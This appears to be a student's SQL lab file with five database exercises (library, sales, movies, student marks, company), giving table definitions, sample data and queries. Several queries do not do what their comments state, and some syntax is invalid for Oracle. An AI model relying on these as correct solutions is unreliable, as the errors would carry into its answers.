1st program:
-- Create Table PUBLISHER with Primary Key as NAME
CREATE TABLE PUBLISHER
(NAME VARCHAR2(20) PRIMARY KEY,
PHONE NUMBER,
ADDRESS VARCHAR2(20));

-- Create Table BOOK with Primary Key as BOOK_ID and Foreign Key PUB_NAME referring the PUBLISHER table
CREATE TABLE BOOK
(BOOK_ID NUMBER PRIMARY KEY,
TITLE VARCHAR2(20),
PUB_YEAR VARCHAR2(20),
PUB_NAME VARCHAR2(20),
CONSTRAINT fk_publisher FOREIGN KEY (PUB_NAME) REFERENCES PUBLISHER(NAME) ON DELETE CASCADE);

-- Create Table BOOK_AUTHORS with Primary Key as BOOK_ID and AUTHOR_NAME and Foreign Key BOOK_ID referring the BOOK table
CREATE TABLE BOOK_AUTHORS
(AUTHOR_NAME VARCHAR2(20),
BOOK_ID NUMBER,
CONSTRAINT fk_book FOREIGN KEY (BOOK_ID) REFERENCES BOOK(BOOK_ID) ON DELETE CASCADE,
PRIMARY KEY(BOOK_ID, AUTHOR_NAME));

-- Create Table LIBRARY_PROGRAMME with Primary Key as PROGRAMME_ID
CREATE TABLE LIBRARY_PROGRAMME
(PROGRAMME_ID NUMBER PRIMARY KEY,
PROGRAMME_NAME VARCHAR2(50),
ADDRESS VARCHAR2(50));

-- Create Table as BOOK_COPIES with Primary Key as BOOK_ID and PROGRAMME_ID and Foreign Key BOOK_ID and PROGRAMME_ID referring the BOOK and LIBRARY_PROGRAMME tables respectively
CREATE TABLE BOOK_COPIES
(NO_OF_COPIES NUMBER,
BOOK_ID NUMBER,
PROGRAMME_ID NUMBER,
CONSTRAINT fk_book_copy FOREIGN KEY (BOOK_ID) REFERENCES BOOK(BOOK_ID) ON DELETE CASCADE,
CONSTRAINT fk_programme_copy FOREIGN KEY(PROGRAMME_ID) REFERENCES LIBRARY_PROGRAMME(PROGRAMME_ID) ON DELETE CASCADE,
PRIMARY KEY (BOOK_ID,PROGRAMME_ID));

-- Create Table CARD with Primary Key as CARD_NO
CREATE TABLE CARD
(CARD_NO NUMBER PRIMARY KEY);

-- Create Table BOOK_LENDING With Primary Key as BOOK_ID, PROGRAMME_ID and CARD_NO and Foreign key as BOOK_ID, PROGRAMME_ID and CARD_NO referring the BOOK, LIBRARY_PROGRAMME and CARD tables respectively
CREATE TABLE BOOK_LENDING
(BOOK_ID NUMBER,
PROGRAMME_ID NUMBER,
CARD_NO NUMBER,
DATE_OUT DATE,
DUE_DATE DATE,
CONSTRAINT fk_book_lending_book FOREIGN KEY (BOOK_ID) REFERENCES BOOK(BOOK_ID) ON DELETE CASCADE,
CONSTRAINT fk_book_lending_programme FOREIGN KEY (PROGRAMME_ID) REFERENCES LIBRARY_PROGRAMME(PROGRAMME_ID) ON DELETE CASCADE,
CONSTRAINT fk_book_lending_card FOREIGN KEY (CARD_NO) REFERENCES CARD(CARD_NO) ON DELETE CASCADE,
PRIMARY KEY (BOOK_ID,PROGRAMME_ID,CARD_NO));

-- Inserting records into PUBLISHER table
INSERT INTO PUBLISHER VALUES('SAPNA', 912121212, 'BANGALORE');
INSERT INTO PUBLISHER VALUES('PENGUIN', 921212121, 'NEW YORK');
INSERT INTO PUBLISHER VALUES('PEARSON', 913131313, 'HYDERABAD');
INSERT INTO PUBLISHER VALUES('OZONE', 931313131, 'CHENNAI');
INSERT INTO PUBLISHER VALUES('PLANETZ', 914141414, 'BANGALORE');

-- Inserting records into BOOK table
INSERT INTO BOOK VALUES(1, 'BASICS OF EXCEL', 'JAN-2017', 'SAPNA');
INSERT INTO BOOK VALUES(2, 'PROGRAMMING MINDSET', 'JUN-2018', 'PLANETZ');
INSERT INTO BOOK VALUES(3, 'BASICS OF SQL', 'SEP-2016', 'PEARSON');
INSERT INTO BOOK VALUES(4, 'DBMS FOR BEGINNERS', 'SEP-2015', 'PLANETZ');
INSERT INTO BOOK VALUES(5, 'WEB SERVICES', 'MAY-2017', 'OZONE');

-- Inserting records into BOOK_AUTHORS table
INSERT INTO BOOK_AUTHORS VALUES('SRI DEVI', 1);
INSERT INTO BOOK_AUTHORS VALUES('DEEPAK', 2);
INSERT INTO BOOK_AUTHORS VALUES('PRAMOD', 3);
INSERT INTO BOOK_AUTHORS VALUES('SWATHI', 4);
INSERT INTO BOOK_AUTHORS VALUES('PRATHIMA', 5);

-- Inserting records into LIBRARY_PROGRAMME table
INSERT INTO LIBRARY_PROGRAMME VALUES(100, 'HSR LAYOUT', 'BANGALORE');
INSERT INTO LIBRARY_PROGRAMME VALUES(101, 'KENGERI', 'BANGALORE');
INSERT INTO LIBRARY_PROGRAMME VALUES(102, 'BANASHANKARI', 'BANGALORE');
INSERT INTO LIBRARY_PROGRAMME VALUES(103, 'SHANKARA NAGAR', 'MANGALORE');
INSERT INTO LIBRARY_PROGRAMME VALUES(104, 'MANIPAL', 'UDUPI');

-- Inserting records into BOOK_COPIES table
INSERT INTO BOOK_COPIES VALUES(10, 1, 100);
INSERT INTO BOOK_COPIES VALUES(16, 1, 101);
INSERT INTO BOOK_COPIES VALUES(20, 2, 102);
INSERT INTO BOOK_COPIES VALUES(6, 2, 103);
INSERT INTO BOOK_COPIES VALUES(4, 3, 104);
INSERT INTO BOOK_COPIES VALUES(7, 5, 100);
INSERT INTO BOOK_COPIES VALUES(3, 4, 101);

-- Inserting records into CARD table
INSERT INTO CARD VALUES(500);
INSERT INTO CARD VALUES(501);
INSERT INTO CARD VALUES(502);
INSERT INTO CARD VALUES(503);
INSERT INTO CARD VALUES(504);

-- Inserting records into BOOK_LENDING table
INSERT INTO BOOK_LENDING VALUES(1, 100, 501, TO_DATE('2017-01-01', 'YYYY-MM-DD'), TO_DATE('2017-01-31', 'YYYY-MM-DD'));
INSERT INTO BOOK_LENDING VALUES(3, 104, 501, TO_DATE('2017-01-11', 'YYYY-MM-DD'), TO_DATE('2017-03-01', 'YYYY-MM-DD'));
INSERT INTO BOOK_LENDING VALUES(2, 103, 501, TO_DATE('2017-02-21', 'YYYY-MM-DD'), TO_DATE('2017-04-21', 'YYYY-MM-DD'));
INSERT INTO BOOK_LENDING VALUES(4, 101, 501, TO_DATE('2017-03-11', 'YYYY-MM-DD'), TO_DATE('2017-06-11', 'YYYY-MM-DD'));
INSERT INTO BOOK_LENDING VALUES(1, 101, 504, TO_DATE('2017-04-09', 'YYYY-MM-DD'), TO_DATE('2017-07-08', 'YYYY-MM-DD'));

queries:
--------------------------
queries:
--------------------------

--Retrieve details of all books in the library – id, title, name of publisher, authors,
--number of copies in each Programme, etc. 

SELECT B.BOOK_ID, B.TITLE, B.PUB_NAME, A.AUTHOR_NAME,C.NO_OF_COPIES,L.PROGRAMME_ID
FROM BOOK B, BOOK_AUTHORS A, BOOK_COPIES C, LIBRARY_PROGRAMME L
WHERE B.BOOK_ID=A.BOOK_ID
AND B.BOOK_ID=C.BOOK_ID
AND L.PROGRAMME_ID=C.PROGRAMME_ID;

---------------------------------------------

--Get the particulars of borrowers who have borrowed more than 3 books, but
--from Jan 2017 to Jun 2017. 

SELECT CARD_NO
FROM BOOK_LENDING
WHERE DATE_OUT BETWEEN '2017-01-01' AND '2017-06-01'
GROUP BY CARD_NO
HAVING COUNT(*)>3;

---------------------------------------------

--Delete a book in BOOK table. Update the contents of other tables to reflect this
--data manipulation operation. 

DELETE FROM BOOK
WHERE BOOK_ID=3; 

SELECT * FROM BOOK;

SELECT * FROM BOOK_AUTHORS;

---------------------------------------------

--Partition the BOOK table based on year of publication. Demonstrate its working
--with a simple query. 

CREATE VIEW V_PUBLICATION AS SELECT
PUB_YEAR
FROM BOOK; 

SELECT * FROM V_PUBLICATION;

---------------------------------------------

--Create a view of all books and its number of copies that are currently available
--in the Library.

CREATE VIEW V_BOOKS AS
SELECT B.BOOK_ID, B.TITLE, C.NO_OF_COPIES
FROM
BOOK B, BOOK_COPIES C, LIBRARY_PROGRAMME L
WHERE B.BOOK_ID=C.BOOK_ID
AND C.PROGRAMME_ID=L.PROGRAMME_ID;

SELECT * FROM V_BOOKS;

2nd program:-----------------------------------------------------------------------------------------------------
-- Create Table SALESMAN with Primary Key as SALESMAN_ID

CREATE TABLE SALESMAN(
SALESMAN_ID INTEGER PRIMARY KEY,
NAME VARCHAR2(20),
CITY VARCHAR2(20),
COMMISSION VARCHAR2(20));

DESC SALESMAN;

--------------------------------------

-- Create Table CUSTOMER with Primary Key as CUSTOMER_ID and Foreign Key SALESMAN_ID referring the SALESMAN table

CREATE TABLE CUSTOMER(
CUSTOMER_ID INTEGER PRIMARY KEY,
CUST_NAME VARCHAR2(20),
CITY VARCHAR2(20),
GRADE INTEGER,
SALESMAN_ID INTEGER,
FOREIGN KEY (SALESMAN_ID) REFERENCES SALESMAN(SALESMAN_ID) ON DELETE SET NULL);

DESC CUSTOMER;

--------------------------------------

-- Create Table ORDERS with Primary Key as ORDER_NO and Foreign Key CUSTOMER_ID and SALESMAN_ID referring the CUSTOMER and SALESMAN tables respectively

CREATE TABLE ORDERS(
ORDER_NO INTEGER PRIMARY KEY,
PURCHASE_AMOUNT NUMBER(10,2),
ORDER_DATE DATE,
CUSTOMER_ID INTEGER,
SALESMAN_ID INTEGER,
FOREIGN KEY (CUSTOMER_ID) REFERENCES CUSTOMER(CUSTOMER_ID)ON DELETE CASCADE,
FOREIGN KEY (SALESMAN_ID) REFERENCES SALESMAN(SALESMAN_ID) ON DELETE CASCADE);

DESC ORDERS;

------------------------------------------------------------------------------
-- Inserting records into SALESMAN table

INSERT INTO SALESMAN VALUES(1000,'RAHUL','BANGALORE','20%');
INSERT INTO SALESMAN VALUES(2000,'ANKITA','BANGALORE','25%');
INSERT INTO SALESMAN VALUES(3000,'SHARMA','MYSORE','30%');
INSERT INTO SALESMAN VALUES(4000,'ANJALI','DELHI','15%');
INSERT INTO SALESMAN VALUES(5000,'RAJ','HYDERABAD','15%');

SELECT * FROM SALESMAN;

------------------------------------------

-- Inserting records into CUSTOMER table

INSERT INTO CUSTOMER VALUES(1,'ADYA','BANGALORE',100,1000);
INSERT INTO CUSTOMER VALUES(2,'BANU','MANGALORE',300,1000);
INSERT INTO CUSTOMER VALUES(3,'CHETHAN','CHENNAI',400,2000);
INSERT INTO CUSTOMER VALUES(4,'DANISH','BANGALORE',200,2000);
INSERT INTO CUSTOMER VALUES(5,'ESHA','BANGALORE',400,3000);

SELECT * FROM CUSTOMER;

------------------------------------------

-- Inserting records into ORDERS table

INSERT INTO ORDERS VALUES(201,5000,'2020-06-02',1,1000);
INSERT INTO ORDERS VALUES(202,450,'2020-04-09',1,2000);
INSERT INTO ORDERS VALUES(203,1000,'2020-03-15',3,2000);
INSERT INTO ORDERS VALUES(204,3500,'2020-07-09',4,3000);
INSERT INTO ORDERS VALUES(205,550,'2020-05-05',2,2000);

SELECT * FROM ORDERS;

----------------------------------------------------------------------
queries:


-- Count the customers with grades above Bangalore’s average

SELECT GRADE,COUNT(DISTINCT CUSTOMER_ID)
FROM CUSTOMER
GROUP BY GRADE
HAVING GRADE>(SELECT AVG(GRADE)
FROM CUSTOMER
WHERE CITY='BANGALORE');

----------------------------------

--Find the name and numbers of all salesman who had more than one customer

SELECT SALESMAN_ID, NAME
FROM SALESMAN S
WHERE (SELECT COUNT(*)
FROM CUSTOMER C
WHERE C.SALESMAN_ID=S.SALESMAN_ID) > 1;

----------------------------------

--List all the salesman and indicate those who have and don’t have customers in their cities (Use UNION operation.)

SELECT S.SALESMAN_ID, S.NAME, C.CUST_NAME, S.COMMISSION
FROM SALESMAN S, CUSTOMER C
WHERE S.CITY=C.CITY
UNION
SELECT S.SALESMAN_ID,S.NAME,'NO MATCH',S.COMMISSION
FROM SALESMAN S
WHERE CITY NOT IN 
(SELECT CITY
FROM CUSTOMER)
ORDER BY 1 ASC;

-----------------------------------

--Create a view that finds the salesman who has the customer with the highest order of a day.

CREATE VIEW V_SALESMAN AS
SELECT O.ORDER_DATE, S.SALESMAN_ID, S.NAME
FROM SALESMAN S,ORDERS O
WHERE S.SALESMAN_ID = O.SALESMAN_ID
AND O.PURCHASE_AMOUNT= (SELECT MAX(PURCHASE_AMOUNT)
FROM ORDERS C
WHERE C.ORDER_DATE=O.ORDER_DATE);

SELECT * FROM V_SALESMAN;

-----------------------------------

--Demonstrate the DELETE operation by removing salesman with id 1000. All his orders must also be deleted.

DELETE FROM SALESMAN
WHERE SALESMAN_ID=1000;

SELECT * FROM SALESMAN;

SELECT * FROM ORDERS;

3rd program:
---------------------------------------------------------------------------------------------------------------
-- Create Table ACTOR with Primary Key as ACT_ID

CREATE TABLE ACTOR (
ACT_ID INTEGER PRIMARY KEY,
ACT_NAME VARCHAR2(20),
ACT_GENDER CHAR(1));

DESC ACTOR;

----------------------------

-- Create Table DIRECTOR with Primary Key as DIR_ID

CREATE TABLE DIRECTOR(
DIR_ID INTEGER PRIMARY KEY,
DIR_NAME VARCHAR2(20),
DIR_PHONE NUMBER);

DESC DIRECTOR;

----------------------------

-- Create Table MOVIES with Primary Key as MOV_ID and Foreign Key DIR_ID referring DIRECTOR table

CREATE TABLE MOVIES(
MOV_ID INTEGER PRIMARY KEY,
MOV_TITLE VARCHAR2(25),
MOV_YEAR INTEGER,
MOV_LANG VARCHAR2(15),
DIR_ID INTEGER,
FOREIGN KEY (DIR_ID) REFERENCES DIRECTOR(DIR_ID));

DESC MOVIES;

----------------------------

-- Create Table MOVIE_CAST with Primary Key as MOV_ID and ACT_ID and Foreign Key ACT_ID and MOV_ID referring ACTOR and MOVIES tables respectively

CREATE TABLE MOVIE_CAST(
ACT_ID INTEGER,
MOV_ID INTEGER,
ROLE VARCHAR2(10),
PRIMARY KEY (ACT_ID,MOV_ID),
FOREIGN KEY (ACT_ID) REFERENCES ACTOR(ACT_ID),
FOREIGN KEY (MOV_ID) REFERENCES MOVIES(MOV_ID));

DESC MOVIE_CAST;

----------------------------

-- Create Table RATING with Primary Key as MOV_ID and Foreign Key MOV_ID referring MOVIES table

CREATE TABLE RATING(
MOV_ID INTEGER PRIMARY KEY,
REV_STARS VARCHAR2(25),
FOREIGN KEY (MOV_ID) REFERENCES MOVIES(MOV_ID));

DESC RATING;

Insertion:-------------------------------------------------------

-- Inserting records into ACTOR table

INSERT INTO ACTOR VALUES(101,'RAHUL','M');
INSERT INTO ACTOR VALUES(102,'ANKITHA','F');
INSERT INTO ACTOR VALUES(103,'RADHIKA','F');
INSERT INTO ACTOR VALUES(104,'CHETHAN','M');
INSERT INTO ACTOR VALUES(105,'VIVAN','M');

SELECT * FROM ACTOR;

-----------------------------

-- Inserting records into DIRECTOR table

INSERT INTO DIRECTOR VALUES(201,'ANUP',918181818);
INSERT INTO DIRECTOR VALUES(202,'HITCHCOCK',918181812);
INSERT INTO DIRECTOR VALUES(203,'SHASHANK',918181813);
INSERT INTO DIRECTOR VALUES(204,'STEVEN SPIELBERG',918181814);
INSERT INTO DIRECTOR VALUES(205,'ANAND',918181815);

SELECT * FROM DIRECTOR;

------------------------------

-- Inserting records into MOVIES table

INSERT INTO MOVIES VALUES(1001,'MANASU',2017,'KANNADA',201);
INSERT INTO MOVIES VALUES(1002,'AAKASHAM',2015,'TELUGU',202);
INSERT INTO MOVIES VALUES(1003,'KALIYONA',2008,'KANNADA',201);
INSERT INTO MOVIES VALUES(1004,'WAR HORSE',2011,'ENGLISH',204);
INSERT INTO MOVIES VALUES(1005,'HOME',2012,'ENGLISH',205);

SELECT * FROM MOVIES;

-----------------------------

-- Inserting records into MOVIE_CAST table

INSERT INTO MOVIE_CAST VALUES(101,1002,'HERO');
INSERT INTO MOVIE_CAST VALUES(101,1001,'HERO');
INSERT INTO MOVIE_CAST VALUES(103,1003,'HEROINE');
INSERT INTO MOVIE_CAST VALUES(103,1002,'GUEST');
INSERT INTO MOVIE_CAST VALUES(104,1004,'HERO');

SELECT * FROM MOVIE_CAST;

-----------------------------

-- Inserting records into RATING table

INSERT INTO RATING VALUES(1001,'4');
INSERT INTO RATING VALUES(1002,'2');
INSERT INTO RATING VALUES(1003,'5');
INSERT INTO RATING VALUES(1004,'4');
INSERT INTO RATING VALUES(1005,'3');

SELECT * FROM RATING;

queries:----------------------------------------------------------------


--List the titles of all movies directed by ‘Hitchcock’.

SELECT MOV_TITLE
FROM MOVIES
WHERE DIR_ID = (SELECT DIR_ID
FROM DIRECTOR
WHERE DIR_NAME='HITCHCOCK');

---------------------------------

--Find the movie names where one or more actors acted in two or more movies.

SELECT MOV_TITLE
FROM MOVIES M,MOVIE_CAST MC
WHERE M.MOV_ID=MC.MOV_ID AND ACT_ID IN (SELECT ACT_ID
FROM MOVIE_CAST GROUP BY ACT_ID
HAVING COUNT(ACT_ID)>1)
GROUP BY MOV_TITLE
HAVING COUNT(*)>1;

--------------------------------

--List all actors who acted in a movie before 2000 and also in a movie after 2015 (use JOIN operation).

SELECT ACT_NAME
FROM ACTOR A
JOIN MOVIE_CAST C
ON A.ACT_ID=C.ACT_ID
JOIN MOVIES M
ON C.MOV_ID=M.MOV_ID
WHERE M.MOV_YEAR NOT BETWEEN 2000 AND 2015;

--------------------------------

--Find the title of movies and number of stars for each movie that has at least one rating 
--and find the highest number of stars that movie received. Sort the result by
--movie title.

SELECT MOV_TITLE,MAX(REV_STARS)
FROM MOVIES
INNER JOIN RATING USING (MOV_ID)
GROUP BY MOV_TITLE
HAVING MAX(REV_STARS)>0
ORDER BY MOV_TITLE;

---------------------------------

--Update rating of all movies directed by ‘Steven Spielberg’ to 5.

UPDATE RATING
SET REV_STARS=5
WHERE MOV_ID IN (SELECT MOV_ID FROM MOVIES
WHERE DIR_ID IN (SELECT DIR_ID
FROM DIRECTOR
WHERE DIR_NAME='STEVEN SPIELBERG'));

4th program------------------------------------------------------------------------------------------------------
 

CREATE TABLE STUDENT(
USN VARCHAR2(20) PRIMARY KEY,
SNAME VARCHAR2(20),
ADDRESS VARCHAR2(20),
PHONE INTEGER(10),
GENDER CHAR(1));


CREATE TABLE SEMSEC(
SSID VARCHAR2(20) PRIMARY KEY,
SEM INTEGER(2),
SEC CHAR(1));

     CREATE TABLE CLASS(
     USN VARCHAR2(20),
     SSID VARCHAR2(20),
     PRIMARY KEY(USN,SSID),
     FOREIGN KEY(USN)REFERENCES STUDENT(USN),
    FOREIGN KEY(SSID)REFERENCES SEMSEC(SSID));

CREATE TABLE SUBJECT(
SUBCODE VARCHAR2(20) PRIMARY KEY,
TITLE VARCHAR2(20),
SEM INTEGER(2),
CREDITS INTEGER(2));


CREATE TABLE IAMARKS(
USN VARCHAR2(20),
SUBCODE VARCHAR2(20),
SSID VARCHAR2(20),
TEST1 INTEGER(2),
TEST2 INTEGER(2),
TEST3 INTEGER(2),
FINALIA INTEGER(2),
FOREIGN KEY(USN)REFERENCES STUDENT(USN),
FOREIGN KEY(SUBCODE)REFERENCES SUBJECT(SUBCODE),
FOREIGN KEY(SSID)REFERENCES SEMSEC(SSID));


INSERT INTO STUDENT VALUES('1RN13CS020','ARUN','BELGAVI',8475869584,'M');
INSERT INTO STUDENT VALUES('1RN13CS010','MALA','MANGLORE',8748523161,'F');
INSERT INTO STUDENT VALUES('1RN13CS091','TEESHA','BENGALURU',8741023698,'F');
INSERT INTO STUDENT VALUES('1RN13CS027','SHWETHA','HUBLI',7412369985,'F');
INSERT INTO STUDENT VALUES('1RN14CS005','ARJUN','BENGALURU',8546987452,'M');
INSERT INTO STUDENT VALUES('1RN14CS075','JESSI','BENGALURU',7487454124,'F');
INSERT INTO STUDENT VALUES('1RN14CS047','JASMINE','BENGALURU',9458745632,'F');
INSERT INTO STUDENT VALUES('1RN15CS097','BHARATH','SHIMOGA',6363055444,'M');
INSERT INTO STUDENT VALUES('1RN15CS147','MANDARA','MANGLORE',8745968212,'F');
INSERT INTO STUDENT VALUES('1RN15CS085','BINDHU','KODAGU',7458963215,'F');
INSERT INTO STUDENT VALUES('1RN15CS091','VISHWA','BELLARY',8458758452,'M');
INSERT INTO STUDENT VALUES('1RN16CS049','SHARAN','KALBURGI',7898458475,'M');
INSERT INTO STUDENT VALUES('1RN16CS125','SAMEERA','BIJAPUR',8231569585,'F');
INSERT INTO STUDENT VALUES('1RN16CS108','SUMIT','CHITRADURGA',8904174745,'M');


INSERT INTO SEMSEC VALUES('CSE8A',8,'A');
INSERT INTO SEMSEC VALUES('CSE8B',8,'B');
INSERT INTO SEMSEC VALUES('CSE8C',8,'C');
INSERT INTO SEMSEC VALUES('CSE7A',7,'A');
INSERT INTO SEMSEC VALUES('CSE7B',7,'B');
INSERT INTO SEMSEC VALUES('CSE7C',7,'C');
INSERT INTO SEMSEC VALUES('CSE6A',6,'A');
INSERT INTO SEMSEC VALUES('CSE6B',6,'B');
INSERT INTO SEMSEC VALUES('CSE6C',6,'C');
INSERT INTO SEMSEC VALUES('CSE5A',5,'A');
INSERT INTO SEMSEC VALUES('CSE5B',5,'B');
INSERT INTO SEMSEC VALUES('CSE5C',5,'C');
INSERT INTO SEMSEC VALUES('CSE4A',4,'A');
INSERT INTO SEMSEC VALUES('CSE4B',4,'B');
INSERT INTO SEMSEC VALUES('CSE4C',4,'C');
INSERT INTO SEMSEC VALUES('CSE3A',3,'A');
INSERT INTO SEMSEC VALUES('CSE3B',3,'B');
INSERT INTO SEMSEC VALUES('CSE3C',3,'C');
INSERT INTO SEMSEC VALUES('CSE2A',2,'A');
INSERT INTO SEMSEC VALUES('CSE2B',2,'B');
INSERT INTO SEMSEC VALUES('CSE2C',2,'C');
INSERT INTO SEMSEC VALUES('CSE1A',1,'A');
INSERT INTO SEMSEC VALUES('CSE1B',1,'B');
INSERT INTO SEMSEC VALUES('CSE1C',1,'C');


INSERT INTO CLASS VALUES('1RN13CS020','CSE8A');
INSERT INTO CLASS VALUES('1RN13CS010','CSE8A');
INSERT INTO CLASS VALUES('1RN13CS091','CSE8B');
INSERT INTO CLASS VALUES('1RN13CS027','CSE8C');

INSERT INTO CLASS VALUES('1RN14CS005','CSE7A');
INSERT INTO CLASS VALUES('1RN14CS075','CSE7A');
INSERT INTO CLASS VALUES('1RN14CS047','CSE7A');

INSERT INTO CLASS VALUES('1RN15CS097','CSE4A');
INSERT INTO CLASS VALUES('1RN15CS147','CSE4A');
INSERT INTO CLASS VALUES('1RN15CS085','CSE4B');
INSERT INTO CLASS VALUES('1RN15CS091','CSE4C');

INSERT INTO CLASS VALUES('1RN16CS049','CSE3A');
INSERT INTO CLASS VALUES('1RN16CS125','CSE3B');
INSERT INTO CLASS VALUES('1RN16CS108','CSE3C');


INSERT INTO SUBJECT VALUES('10CS81','NM',8,4);
INSERT INTO SUBJECT VALUES('10CS82','MM',8,4);
INSERT INTO SUBJECT VALUES('10CS83','NAM',8,4);
INSERT INTO SUBJECT VALUES('10CS84','ATS',8,4);
INSERT INTO SUBJECT VALUES('10CS85','AWS',8,4);
INSERT INTO SUBJECT VALUES('10CS71','MTRS',7,4);
INSERT INTO SUBJECT VALUES('10CS72','SS',7,4);
INSERT INTO SUBJECT VALUES('10CS73','FSWD',7,4);
INSERT INTO SUBJECT VALUES('10CS74','META',7,4);
INSERT INTO SUBJECT VALUES('10CS75','RM',7,4);
INSERT INTO SUBJECT VALUES('10CS76','SOF',7,4);
INSERT INTO SUBJECT VALUES('15CS51','DBMS',5,3);
INSERT INTO SUBJECT VALUES('15CS52','ATCS',5,3);
INSERT INTO SUBJECT VALUES('15CS53','CN',5,3);
INSERT INTO SUBJECT VALUES('15CS54','ANJS',5,3);
INSERT INTO SUBJECT VALUES('15CS55','AIML',5,3);
INSERT INTO SUBJECT VALUES('15CS56','EVS',5,3);
INSERT INTO SUBJECT VALUES('15CS41','DAA',4,4);
INSERT INTO SUBJECT VALUES('15CS42','MCES',4,4);
INSERT INTO SUBJECT VALUES('15CS43','OS',4,4);
INSERT INTO SUBJECT VALUES('15CS44','WEB',4,4);
INSERT INTO SUBJECT VALUES('15CS45','BIOLOGY',4,4);
INSERT INTO SUBJECT VALUES('15CS46','MATHS',4,4);
INSERT INTO SUBJECT VALUES('15CS31','DSA',3,4);
INSERT INTO SUBJECT VALUES('15CS32','ADE',3,4);
INSERT INTO SUBJECT VALUES('15CS33','JAVA',3,4);
INSERT INTO SUBJECT VALUES('15CS34','COA',3,4);
INSERT INTO SUBJECT VALUES('15CS35','PYTHON',3,4);
INSERT INTO SUBJECT VALUES('15CS36','SCR',3,4);




INSERT INTO IAMARKS(USN,SUBCODE,SSID,TEST1,TEST2,TEST3)VALUES('1RN13CS091','10CS81','CSE8C',19,15,18);
INSERT INTO IAMARKS(USN,SUBCODE,SSID,TEST1,TEST2,TEST3)VALUES('1RN13CS091','10CS82','CSE8C',20,15,17);
INSERT INTO IAMARKS(USN,SUBCODE,SSID,TEST1,TEST2,TEST3)VALUES('1RN13CS091','10CS83','CSE8C',18,15,13);
INSERT INTO IAMARKS(USN,SUBCODE,SSID,TEST1,TEST2,TEST3)VALUES('1RN13CS091','10CS84','CSE8C',19,16,17);
INSERT INTO IAMARKS(USN,SUBCODE,SSID,TEST1,TEST2,TEST3)VALUES('1RN13CS091','10CS85','CSE8C',19,20,18);


QUERIES
1.LIST ALL STUDENTS  STUDYING IN 4TM SEM C SECTION:

SELECT S.*,SS.SEM,SS.SEC
FROM STUDENT S,SEMSEC SS,CLASS C
WHERE S.USN=C.USN AND 
SS.SSID=C.SSID AND
SS.SEM=4 AND
SS.SEC='C';

2.. Compute the total number of male and female students in each semester and in each 
section

SELECT SS.SEM,SS.SEC,S.GENDER,COUNT(S.GENDER)AS COUNT
FROM STUDENT S,SEMSEC SS,CLASS C
WHERE S.USN=C.USN AND
SS.SSID=C.SSID
GROUP BY SS.SEM,SS.SEC,S.GENDER
ORDER BY SEM;

3.Create a view of Test1 marks of student USN ‘1BI15CS101’ in all subjects.
  
CREATE VIEW ST
AS 
SELECT TEST1,SUBCODE
FROM IAMARKS
WHERE USN='1RN13CS091';

4.Calculate the FinalIA (average of best two test marks) and update the corresponding 
table for all students

UPDATE IAMARKS
SET FINALIA=(CASE WHEN GREATEST(TEST1,TEST2)<>GREATEST(TEST1,TEST3)
THEN  GREATEST(TEST1,TEST2)+GREATEST(TEST1,TEST3)
ELSE GREATEST(TEST1,TEST2)+GREATEST(TEST2,TEST3)
END)/2
WHERE FINALIA IS NULL;

5. Categorize students based on the following criterion:
If FinalIA = 17 to 20 then CAT = ‘Outstanding’
If FinalIA = 12 to 16 then CAT = ‘Average’
If FinalIA< 12 then CAT = ‘Weak’
Give these details only for 8th semester A, B, and C section students.

SELECT S.USN,S.SNAME,S.ADDRESS,S.PHONE,S.GENDER,
(CASE 
WHEN IA.FINALIA BETWEEN 17 AND 20 THEN 'OUTSTANDING'
WHEN IA.FINALIA BETWEEN 12 AND 16 THEN 'AVERAGE'
ELSE 'WEAK'
END) AS CAT
FROM STUDENT S,SEMSEC SS,IAMARKS IA,SUBJECT SUB
WHERE S.USN=IA.USN AND
SUB.SUBCODE=IA.SUBCODE AND
SS.SSID=IA.SSID AND
SUB.SEM=8;


5th PROGRAM COMPANY DATABASE-------------------------------------------------------------------------------------


CREATE TABLE DEPARTMENT(
DNO VARCHAR2(20) PRIMARY KEY,
DNAME VARCHAR2(20),
MGR_STARTDATE DATE);

CREATE TABLE EMPLOYEE(
SSN VARCHAR2(20) PRIMARY KEY,
FNAME VARCHAR2(20),
LNAME VARCHAR2(20),
ADDRESS VARCHAR2(20),
SEX CHAR(1),
SALARY INTEGER,
SUPERSSN VARCHAR2(20),
DNO VARCHAR2(20),
FOREIGN KEY(SUPERSSN)REFERENCES EMPLOYEE(SSN),
FOREIGN KEY(DNO)REFERENCES DEPARTMENT(DNO));
 
ALTER TABLE DEPARTMENT
ADD COLUMN MGRSSN VARCHAR2(20);

ALTER TABLE DEPARTMENT 
ADD CONSTRAINT FOREIGN KEY(MGRSSN) REFERENCES EMPLOYEE(SSN);

CREATE TABLE DLOCATION(
DNO VARCHAR2(20),
DLOC VARCHAR2(20),
PRIMARY KEY(DNO,DLOC),
FOREIGN KEY(DNO)REFERENCES DEPARTMENT(DNO));


CREATE TABLE PROJECT(
PNO VARCHAR2(20) PRIMARY KEY,
PNAME VARCHAR2(20),
PLOCATION VARCHAR2(20),
DNO VARCHAR2(20),
FOREIGN KEY(DNO)REFERENCES DEPARTMENT(DNO));

CREATE TABLE WORKSON(
ESSN VARCHAR2(20),
PNO VARCHAR2(20),
HOURS INTEGER,
PRIMARY KEY(ESSN,PNO),
FOREIGN KEY(ESSN)REFERENCES EMPLOYEE(SSN),
FOREIGN KEY(PNO)REFERENCES PROJECT(PNO));


INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSECE01','JOHN','SCOTT','BANGLORE','M',200000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSCSE01','AKSHAY','KUMAR','BANGLORE','M',800000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSCSE02','EDWARD','SCOTT','BANGLORE','M',500000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSCSE03','ANJALI','MISHRA','MYSOOR','F',450000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSCSE04','ROHIT','SHARMA','BIDAR','M',650000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSCSE05','SURYA','YADAV','MANGLORE','M',350000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSCSE06','ARUN','RAJ','BANGLORE','M',900000);
